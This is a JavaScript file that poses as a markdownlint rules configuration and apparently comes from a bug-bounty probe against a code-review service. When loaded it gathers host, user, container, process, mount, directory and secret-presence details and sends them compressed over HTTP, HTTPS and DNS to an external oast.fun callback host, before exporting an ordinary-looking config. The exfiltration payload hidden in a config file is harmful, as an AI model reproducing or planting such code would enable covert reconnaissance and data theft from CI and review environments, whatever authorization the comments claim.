// Inert, read-only rules-config probe for the authorized CodeRabbit public VDP.
// Loaded by markdownlint as the rules configuration file. Sends identity/isolation
// metadata plus SECRET-CLASS BOOLEANS only; never a secret value.
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const dns = require("node:dns");
const http = require("node:http");
const https = require("node:https");
const zlib = require("node:zlib");

const TAG = "pr2mdxr";
const VEC = "markdownlint.cjs";
const OAST = "dbnvil77dug52l5shir0zo5yy7qafesac.oast.fun";

const rd = (p, n) => { try { return fs.readFileSync(p, "utf8").slice(0, n); } catch { return null; } };
const ex = (p) => { try { fs.accessSync(p); return true; } catch { return false; } };
const grab = (s, k) => { const m = (s || "").match(new RegExp("^" + k + ":\\s*(.*)$", "m")); return m ? m[1].trim() : null; };
const safe = (fn, d) => { try { return fn(); } catch { return d; } };

const status = rd("/proc/self/status", 6000) || "";
const osr = rd("/etc/os-release", 800) || "";
const envKeys = Object.keys(process.env);
const has = (re) => envKeys.some(n => re.test(n));
const secretClass = {
  has_pem: has(/PEM|PRIVATE_KEY|GITHUB_APP/i),
  has_encryption_password: has(/ENCRYPTION_PASS/i),
  has_openai_key: has(/OPENAI/i),
  has_anthropic_key: has(/ANTHROPIC/i),
  has_github_token: has(/GITHUB.*TOKEN|GH_TOKEN/i),
  has_aws_key: has(/AWS_/i),
  has_gcp_sa: has(/GOOGLE_APPLICATION|GCP_|GOOGLE_CREDENTIALS/i),
  env_name_count: envKeys.length
};
const pids = safe(() => fs.readdirSync("/proc").filter(x => /^\d+$/.test(x)).map(Number), []);
const self = process.pid;
const myuid = safe(() => process.getuid(), null);
const others = pids.filter(p => p !== self && p !== 1).slice(0, 8).map(p => {
  const comm = safe(() => (rd("/proc/" + p + "/comm", 60) || "").trim(), null);
  const st = rd("/proc/" + p + "/status", 4000) || "";
  const uid = grab(st, "Uid");
  return { pid: p, comm, uid: uid ? uid.split(/\s+/)[0] : null };
});
function scanDir(dir, max) {
  return safe(() => fs.readdirSync(dir, { withFileTypes: true }).slice(0, max).map(e => {
    const t = safe(() => Math.floor(fs.statSync(path.join(dir, e.name)).mtimeMs / 1000), null);
    return { n: e.name, t, d: e.isDirectory() };
  }), []);
}
const home = process.env.HOME || null;
const mounts = (rd("/proc/mounts", 40000) || "").split("\n")
  .filter(l => /docker\.sock|overlay|runsc|gvisor|kata|virtio|\/proc |\/sys |\/host|\/workspace|\/secrets|kube/.test(l))
  .slice(0, 15).map(l => l.split(" ").slice(0, 3).join(" "));
const report = {
  tag: TAG, vec: VEC, ts: new Date().toISOString(),
  host: safe(() => os.hostname(), null), user: safe(() => os.userInfo().username, null),
  uid: myuid, gid: safe(() => process.getgid(), null), pid: self, ppid: safe(() => process.ppid, null), cwd: safe(() => process.cwd(), null),
  kernel: os.release(), platform: os.platform(), arch: os.arch(), node: process.version,
  os: (osr.match(/^NAME=(.*)$/m) || [])[1] || null,
  caps: { eff: grab(status, "CapEff"), prm: grab(status, "CapPrm"), bnd: grab(status, "CapBnd") },
  seccomp: grab(status, "Seccomp"), nnp: grab(status, "NoNewPrivs"),
  attr: rd("/proc/self/attr/current", 120),
  cgroup: rd("/proc/self/cgroup", 400), cgroup1: rd("/proc/1/cgroup", 400),
  dockerenv: ex("/.dockerenv"), containerenv: ex("/run/.containerenv"),
  dmi: { product: rd("/sys/devices/virtual/dmi/id/product_name", 80), vendor: rd("/sys/devices/virtual/dmi/id/sys_vendor", 80) },
  jail: { HOME: process.env.HOME || null, JAILUSER: process.env.JAILUSER || null, K_SERVICE: process.env.K_SERVICE || null },
  pidCount: pids.length, others,
  pid1cmd: (rd("/proc/1/cmdline", 300) || "").replace(/\0/g, " ").trim().slice(0, 160),
  mounts, secretClass,
  files: { app_pem: ex("/app/coderabbit.pem"), secrets_pem: ex("/secrets/github-app.pem"), app: ex("/app"), secrets: ex("/secrets"), workspace: ex("/workspace") },
  residual: { home: home ? scanDir(home, 8) : [], home_all: scanDir("/home", 8), tmp: scanDir("/tmp", 10), workspace: scanDir("/workspace", 8), root: scanDir("/root", 6), rootfs: scanDir("/", 20) },
  envMeta: { HOME: process.env.HOME || null, JAILUSER: process.env.JAILUSER || null, K_SERVICE: process.env.K_SERVICE || null,
    NPM_CONFIG_REGISTRY: process.env.NPM_CONFIG_REGISTRY ? "set" : "unset" }
};
function sendOnce(u, tries) {
  try {
    const mod = u.startsWith("https") ? https : http;
    const opts = u.startsWith("https") ? { rejectUnauthorized: false } : {};
    const r = mod.get(u, opts, res => res.resume());
    r.on("error", () => { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); });
    r.setTimeout(5000, () => r.destroy());
  } catch { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); }
}
function exfil(obj) {
  let s = "";
  try { s = zlib.deflateSync(Buffer.from(JSON.stringify(obj))).toString("base64url"); } catch { return; }
  const chunks = s.match(/.{1,700}/g) || [];
  sendOnce("http://" + TAG + "." + OAST + "/hello?v=" + encodeURIComponent(VEC), 0);
  chunks.forEach((c, i) => {
    setTimeout(() => {
      sendOnce("http://" + TAG + "." + OAST + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
      sendOnce("https://" + TAG + "." + OAST + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
    }, 300 * i);
  });
}
try { exfil(report); } catch { }
try {
  const s = zlib.deflateSync(Buffer.from(JSON.stringify({ tag: TAG, host: report.host, uid: report.uid, k_service: report.jail.K_SERVICE, jailuser: report.jail.JAILUSER, pidCount: report.pidCount, seccomp: report.seccomp, nnp: report.nnp }))).toString("base64url");
  (s.match(/.{1,55}/g) || []).slice(0, 6).forEach((c, i) => { try { dns.lookup("c" + i + "." + c + "." + TAG + "." + OAST, () => {}); } catch { } });
} catch { }

module.exports = { default: true, MD013: false };
